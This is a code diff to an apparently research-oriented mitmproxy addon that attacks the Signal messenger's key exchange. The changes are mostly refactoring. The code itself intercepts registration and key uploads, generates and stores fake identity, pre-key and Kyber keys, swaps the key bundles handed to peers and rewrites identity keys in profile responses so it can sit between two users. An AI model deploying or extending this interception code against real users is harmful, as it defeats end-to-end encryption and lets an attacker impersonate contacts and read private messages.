@@ -1,25 +1,26 @@
-from mitmproxy.http import HTTPFlow
+# from mitmproxy.http import HTTPFlow
 # from mitmproxy import ctx
 from dataclasses import dataclass
 from typing import Optional
 import logging
-from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
+from mitmproxy.http import Request, Response, HTTPFlow
+from xepor import RouteType, HTTPVerb, Router
 import json
-from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
+# from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
+from signal_protocol import helpers
 from base64 import b64decode, b64encode
-from database import *
+from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
-from utils import *
 import re
-from parse import Parser
+import parse
 
 from protos.gen.wire_pb2 import *
-from protos.gen.SignalService_pb2 import *
-from protos.gen.storage_pb2 import *
+# from protos.gen.SignalService_pb2 import *
+# from protos.gen.storage_pb2 import *
 from protos.gen.WebSocketResources_pb2 import *
-from protos.gen.SignalService_pb2 import *
-from protos.gen.sealed_sender_pb2 import *
-from protos.gen import *
+# from protos.gen.SignalService_pb2 import *
+# from protos.gen.sealed_sender_pb2 import *
+# from protos.gen import *
 
 # from server_proto import *
 from server_proto import addons, HOST_HTTPBIN
@@ -33,15 +34,15 @@ bobs_bundle = dict()
 
 class CiphertextMessageType(Enum):
     WHISPER = 2
-    PREKEY_BUNDLE = 3
-    SENDERKEY_DISTRIBUTION = 7
+    PRE_KEY_BUNDLE = 3
+    SENDER_KEY_DISTRIBUTION = 7
     PLAINTEXT = 8
 
 
 @dataclass
 class PendingWebSocket:
-    request: WebSocketMessage = None
-    respone: WebSocketMessage = None
+    request: WebSocketRequestMessage = None
+    response: WebSocketResponseMessage = None
 
 
 websocket_open_state = defaultdict(PendingWebSocket)
@@ -75,8 +76,8 @@ class RegistrationInfo:
     pni: Optional[str] = None
     unidentifiedAccessKey: Optional[str] = None
 
-    aciData: KeyData = None
-    pniData: KeyData = None
+    aciData: Optional[KeyData] = None
+    pniData: Optional[KeyData] = None
 
 
 @dataclass
@@ -96,10 +97,6 @@ def _v1_registration(flow: HTTPFlow):
     req = json.loads(flow.request.content)
     # logging.info(json.dumps(req, indent=4))
 
-    qry = Device.select().where(Device.aciIdenKey == req["aciIdentityKey"])
-
-    # logging.info(f"QUERY: {qry}")
-
     unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']
 
     aci_IdenKey = req['aciIdentityKey']
@@ -118,7 +115,7 @@ def _v1_registration(flow: HTTPFlow):
 
     req.update(fake_signed_pre_keys)
 
-    registration_info[flow.client_conn.address[0]] = RegistrationInfo(
+    registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
         unidentifiedAccessKey=unidentifiedAccessKey,
         aciData=KeyData(
             IdenKey=aci_IdenKey,
@@ -158,7 +155,7 @@ def _v1_registration(flow: HTTPFlow):
 def _v1_registration(flow: HTTPFlow):
     resp = json.loads(flow.response.content)
     # logging.info(f"RESPONSE: {resp}")
-    ip_address = flow.client_conn.address[0]
+    ip_address = flow.client_conn.peername[0]
 
     user = User.insert(
         pNumber=resp["number"],
@@ -188,18 +185,19 @@ def _v2_keys(flow: HTTPFlow):
     identity = flow.request.query["identity"]
 
     req = json.loads(flow.request.content)
-    address = flow.client_conn.address[0]
+    ip_addr = flow.client_conn.peername[0]
 
-    ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
-    if not registration_info.get(address):
-        logging.error(f"Address {address} not found in registration_info. {registration_info}")
+    # TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
+    if not registration_info.get(ip_addr):
+        logging.error(f"Address {ip_addr} not found in registration_info. {registration_info}")
 
-    key_data = registration_info[address].aciData if identity == "aci" else registration_info[address].pniData
+    key_data = registration_info[ip_addr].aciData if identity == "aci" else registration_info[ip_addr].pniData
 
     try:
         alice_identity_key_pair = key_data.fake_IdenKey
     except KeyError:
         logging.exception(f"{flow} AND {registration_info}")
+        return
 
     pq_pre_keys = req["pqPreKeys"]
     pre_keys = req["preKeys"]
@@ -218,7 +216,7 @@ def _v2_keys(flow: HTTPFlow):
 
     legit_bundle = LegitBundle.insert(
         type=identity,
-        aci=registration_info[address].aci,
+        aci=registration_info[ip_addr].aci,
         deviceId=1,  # todo: shouldnt be static
         IdenKey=key_data.IdenKey,
         SignedPreKey=key_data.SignedPreKey,
@@ -229,7 +227,7 @@ def _v2_keys(flow: HTTPFlow):
 
     mitm_bundle = MitMBundle.insert(
         type=identity,
-        aci=registration_info[address].aci,
+        aci=registration_info[ip_addr].aci,
         deviceId=1,  # todo: shouldnt be static
         FakeIdenKey=(b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"),
                      b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")),
@@ -259,10 +257,10 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     ############ MitmToBob setup (fake Alice)
     fake_victims = {}
-    for id, bundle in enumerate(resp["devices"]):
+    for _id, bundle in enumerate(resp["devices"]):
         # data should be uuid of Alice and the device id (in this case 1 is ok)
         fakeVictim = MitmUser(address.ProtocolAddress("1", 1))
-        fake_victims[id] = fakeVictim
+        fake_victims[_id] = fakeVictim
         bob_registartion_id = bundle["registrationId"]
 
         bob_kyber_pre_key_public = b64decode(bundle["pqPreKey"]["publicKey"])
@@ -276,7 +274,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         bob_bundle = state.PreKeyBundle(
             bob_registartion_id,
-            address.DeviceId(id),
+            address.DeviceId(_id),
             (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
             state.SignedPreKeyId(1),
             PublicKey.deserialize(bob_signed_pre_key_public),
@@ -299,13 +297,13 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             lastResortKyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
         )
         legit_bundle.on_conflict_replace().execute()
-        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, id), bob_bundle)
+        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, _id), bob_bundle)
 
-    ############ Swap the prekeybundle TODO 
+    # TODO: Swap the prekeybundle
 
     mitm_bundles = {}
 
-    for id, bundle in enumerate(resp["devices"]):
+    for _id, bundle in enumerate(resp["devices"]):
         # This should impersonate Bob's info 
         # identity_key = MitMBundle.select().where(MitMBundle.type == identity,
         #                                             MitMBundle.aci == uuid,
@@ -314,13 +312,13 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         identity_key = bobs_bundle.get(uuid)
 
         if not identity_key:
-            # todo create row
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, id))
+            # TODO: create row
+            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, _id))
             # identity_key = fakeUser.pre_key_bundle.identity_key()
             identity_key = fakeUser.identity_key_pair
 
         else:
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, id), identity_key=identity_key.fake_identityKey)
+            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identityKey)
             identity_key = identity_key.fake_identityKey
 
         fakeBundle = fakeUser.pre_key_bundle.to_dict()
@@ -328,7 +326,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")
 
         fakeBundle_wire = {
-            "identityKey": b64encode(identity_key.public_key().serialize()).decode("utf-8"),
+            "identityKey": identity_key.public_key().to_base64(),
             "devices": [
                 {
                     "devicedId": 1,
@@ -355,19 +353,18 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             type=identity.lower(),
             aci=uuid,
             deviceId=device_id,
-            FakeIdenKey=(b64encode(identity_key.public_key().serialize()).decode("utf-8"),
-                         b64encode(identity_key.private_key().serialize()).decode("utf-8")),
+            FakeIdenKey=(identity_key.public_key().to_base64(), identity_key.private_key().to_base64()),
             FakeSignedPreKey=(fakeBundle_wire["devices"][0]["signedPreKey"],
-                              b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")),
+                              fakeUser.signed_pre_key_pair.private_key().to_base64()),
             FakePrekeys=(fakeBundle_wire["devices"][0]["preKey"],
-                         b64encode(fakeUser.pre_key_pair.private_key().serialize()).decode("utf-8")),
+                         fakeUser.pre_key_pair.private_key().to_base64()),
             fakeKyberKeys=(fakeBundle_wire["devices"][0]["pqPreKey"],
-                           b64encode(fakeUser.kyber_pre_key_pair.get_private().serialize()).decode("utf-8")),
-            fakeLastResortKyber=(b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(),
-                                 b64encode(fakeUser.last_resort_kyber.get_private().serialize()).decode("utf-8"))
+                           fakeUser.kyber_pre_key_pair.get_private().to_base64()),
+            fakeLastResortKyber=(fakeUser.last_resort_kyber.get_public().to_base64(),
+                                 fakeUser.last_resort_kyber.get_private().to_base64())
         )
         mitm_bundle.on_conflict_replace().execute()
-        mitm_bundles[id] = mitm_bundle, fakeBundle_wire, fakeUser, fake_victims[id]
+        mitm_bundles[_id] = mitm_bundle, fakeBundle_wire, fakeUser, fake_victims[_id]
 
     keys = list(mitm_bundles.keys())
     if len(keys) < 1:
@@ -387,12 +384,12 @@ def _v1_websocket(flow, msg):
     ws_msg = ws_msg.request
     logging.info(f"WEBSOCKET: {ws_msg}")
 
-    id, path = ws_msg.id, ws_msg.path
-    if websocket_open_state.get(id):
-        logging.warning(f"Message already exists with id {id}")
-    websocket_open_state[id].request = ws_msg
+    _id, path = ws_msg.id, ws_msg.path
+    if websocket_open_state.get(_id):
+        logging.warning(f"Message already exists with id {_id}")
+    websocket_open_state[_id].request = ws_msg
 
-    logging.warning(f"Websocket req with id {id} and path {path}")
+    logging.warning(f"Websocket req with id {_id} and path {path}")
 
 
 def _v1_ws_my_profile(flow, identifier, version, credential_request):
@@ -424,14 +421,14 @@ def _v1_ws_profile(flow, identifier):
     logging.info(f"{identifier}")
     try:
         uuid_type, uuid = re.search(r"(PNI|ACI):([a-f0-9-]+)", identifier).groups()
-    except:
+    except AttributeError:
         logging.exception(f"Invalid identifier {identifier}")
         return
     content = json.loads(flow.response.content)
 
     logging.info(f"PROFILE: {content}")
 
-    idenKey = content["identityKey"]
+    iden_key = content["identityKey"]
 
     bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()
 
@@ -439,13 +436,13 @@ def _v1_ws_profile(flow, identifier):
         public_fake_IdenKey = bundle.FakeIdenKey[0]
     else:
         fake_IdenKey = identity_key.IdentityKeyPair.generate()
-        bobs_bundle[uuid] = BobIdenKey(uuid, idenKey, fake_IdenKey)
+        bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_IdenKey)
         public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")
 
     logging.info(f"BUNDLE: {bundle}")
     content["identityKey"] = public_fake_IdenKey
 
-    logging.info(f"content: {content}")  #### TODO: what's happening here? No injection of fake identity key
+    logging.info(f"content: {content}")  # TODO: what's happening here? No injection of fake identity key
 
     # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
     # ideally, we will propage this further by checking if the flow was altered by the handler auto-magically.
@@ -465,13 +462,13 @@ def _v2_ws_message(flow, identifier):
     destintion_user = resp["destination"]
     for msg in resp["messages"]:
         if msg["destinationDeviceId"] != 1:
-            logging.error(f"Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")
+            logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")
 
         msg_type = CiphertextMessageType(int(msg["type"]))
         logging.warning(f"MESSAGE TYPE: {msg_type}")
 
-        if msg_type != CiphertextMessageType.PREKEY_BUNDLE:
-            logging.error(f"Only PREKEY_BUNDLE is supported at the moment. C.f. my Twint ;)")
+        if msg_type != CiphertextMessageType.PRE_KEY_BUNDLE:
+            logging.error("Only PREKEY_BUNDLE is supported at the moment. C.f. my Twint ;)")
             continue
 
         content = b64decode(msg["content"])[1:]
@@ -488,46 +485,43 @@ def _v2_ws_message(flow, identifier):
     # logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")
 
 
-from mitmproxy.http import Request, Response, HTTPFlow
-
-
 def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
     ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response
 
-    f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
+    pseudo_flow = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
     from mitmproxy.http import Headers
 
     if rtype == RouteType.REQUEST:
         # todo: handle headers
-        f.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
-                            scheme=orig_flow.request.scheme.encode(),
-                            method=ws_msg.verb.upper().encode(),
-                            authority=orig_flow.request.authority.encode(),
-                            http_version=orig_flow.request.http_version.encode(),
-                            trailers=None, timestamp_start=orig_flow.request.timestamp_start,
-                            timestamp_end=orig_flow.request.timestamp_end,
-                            path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
+        pseudo_flow.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
+                                      scheme=orig_flow.request.scheme.encode(),
+                                      method=ws_msg.verb.upper().encode(),
+                                      authority=orig_flow.request.authority.encode(),
+                                      http_version=orig_flow.request.http_version.encode(),
+                                      trailers=None, timestamp_start=orig_flow.request.timestamp_start,
+                                      timestamp_end=orig_flow.request.timestamp_end,
+                                      path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
     else:
-        # todo: handle headeers + reason
+        # todo: handle headers + reason
         rp = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
                       headers=Headers(), content=ws_msg.body, trailers=None,
                       timestamp_start=orig_flow.response.timestamp_start,
                       timestamp_end=orig_flow.response.timestamp_end)
-        f.response = rp
-    return f
+        pseudo_flow.response = rp
+    return pseudo_flow
 
 
 ws_resp = Router()
 
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
                   _v1_ws_my_profile, None)
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
 
 ws_req = Router()
-ws_req.add_route(HOST_HTTPBIN, Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v2_ws_message, None)
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v2_ws_message, None)
 
 logging.warning(f"ROUTES (REQ): {ws_req.routes}")
 logging.warning(f"ROUTES (RESP): {ws_resp.routes}")
@@ -540,19 +534,20 @@ def _v1_websocket_req(flow, msg):
     ws_msg = ws_msg.request
     logging.info(f"WEBSOCKET: {ws_msg}")
 
-    id = ws_msg.id
-    if websocket_open_state.get(id):
-        logging.warning(f"Message request already exists for id {id}")
+    _id = ws_msg.id
+    if websocket_open_state.get(_id):
+        logging.warning(f"Message request already exists for id {_id}")
         # return
-    websocket_open_state[id] = PendingWebSocket()
+    websocket_open_state[_id] = PendingWebSocket()
     websocket_open_state[ws_msg.id].request = ws_msg
-    path = websocket_open_state[id].request.path
+    path = websocket_open_state[_id].request.path
 
-    f = decap_ws_msg(flow, msg)
-    handler, params, _ = ws_req.find_handler(HOST_HTTPBIN, path)  # todo: HARDCODING IS BAD, onii-chan
+    flow_decap = decap_ws_msg(flow, msg)
+    # todo: HARDCODING IS BAD - but replays only have IPS not hosts
+    handler, params, _ = ws_req.find_handler(HOST_HTTPBIN, path)
     logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
     if handler:
-        req = handler(f, *params.fixed, **params.named)
+        req = handler(flow_decap, *params.fixed, **params.named)
         if req:
             # msg. = resp
             new_ws = WebSocketMessage()
@@ -568,22 +563,23 @@ def _v1_websocket_resp(flow, msg):
     ws_msg = ws_msg.response
     logging.info(f"WEBSOCKET: {ws_msg}")
 
-    id = ws_msg.id
+    _id = ws_msg.id
 
-    if not websocket_open_state.get(id):
-        logging.warning(f"Message request does not exist for id {id}")
+    if not websocket_open_state.get(_id):
+        logging.warning(f"Message request does not exist for id {_id}")
         return
     # websocket_open_state[ws_msg.id].request = ws_msg
-    path = websocket_open_state[id].request.path
+    path = websocket_open_state[_id].request.path
 
-    websocket_open_state[id].response = ws_msg
-    logging.warning(f"Websocket resp with id {id} and path {path}")
+    websocket_open_state[_id].response = ws_msg
+    logging.warning(f"Websocket resp with id {_id} and path {path}")
 
-    f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
-    handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path)  # todo: HARDCODING IS BAD, onii-chan
+    unwrapped_flow = decap_ws_msg(flow, msg, RouteType.RESPONSE)
+    # todo: HARDCODING IS BAD - but replays only have IPS not hosts
+    handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path)
     logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
     if handler:
-        resp = handler(f, *params.fixed, **params.named)
+        resp = handler(unwrapped_flow, *params.fixed, **params.named)
         if resp:
             # msg. = resp
             new_ws = WebSocketMessage()
